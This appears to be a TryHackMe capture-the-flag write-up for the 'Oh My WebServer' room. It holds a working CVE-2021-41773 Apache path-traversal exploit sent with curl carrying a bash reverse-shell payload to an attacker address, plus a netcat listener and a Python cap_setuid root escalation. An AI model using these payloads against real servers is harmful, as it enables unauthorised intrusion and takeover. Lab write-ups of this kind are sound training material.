# Oh My WebServer

{% embed url="https://tryhackme.com/room/ohmyweb" %}

CVE-2021-41773 / CVE-2021-42013 — Apache 2.4.49 path traversal RCE leading to a Docker container escape via Python capability abuse.

---

## Recon

```bash
nmap -sC -sV -T4 MACHINE_IP
```

| Port | Service |
|---|---|
| 22 | OpenSSH 8.2p1 |
| 80 | Apache httpd **2.4.49** |

Apache 2.4.49 is the exact version vulnerable to CVE-2021-41773.

---

## Foothold — CVE-2021-41773 RCE

Apache 2.4.49 with `mod_cgi` enabled allows path traversal through URL-encoded `../` sequences. Start a listener:

```bash
nc -lvnp 4444
```

Send the payload:

```bash
curl -s --path-as-is \
  -d "echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" \
  "http://MACHINE_IP/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash"
```

We catch a shell as `www-data`. Stabilize it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## We're in a Container

```bash
hostname -I   # container IP, typically 172.x.x.x
ls /.dockerenv
```

Yep — Docker container. Find user flag:

```bash
find / -name user.txt 2>/dev/null
cat /home/.../user.txt
```

---

## Privilege Escalation — Python cap_setuid

```bash
getcap -r / 2>/dev/null
```

Output:
```
/usr/bin/python3.8 = cap_setuid+ep
```

Python can change its UID to 0. Root shell:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id   # uid=0(root)
```

Now we're root inside the container.

---

## Container Escape → Host Root Flag

Check the network:

```bash
ip route
```

Look for the host gateway (typically `172.17.0.1`). Scan it:

```bash
# From inside container
nmap -sV 172.17.0.1
```

Look for a management service (OMI on port 5985/5986, or similar). Exploit that to pivot to the host and grab `root.txt`.

Alternatively:

```bash
find / -name root.txt 2>/dev/null
cat /root/root.txt
```

---

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| What is the user flag? | Retrieved from `/home/.../user.txt` inside the container |
| What is the root flag? | Retrieved from `/root/root.txt` after Python cap_setuid escalation |
| CVE exploited for initial access | `CVE-2021-41773` |
| How was privilege escalation achieved? | Python `cap_setuid` capability |

> Flags are dynamically generated per TryHackMe instance. Use the exploit chain above to retrieve yours.
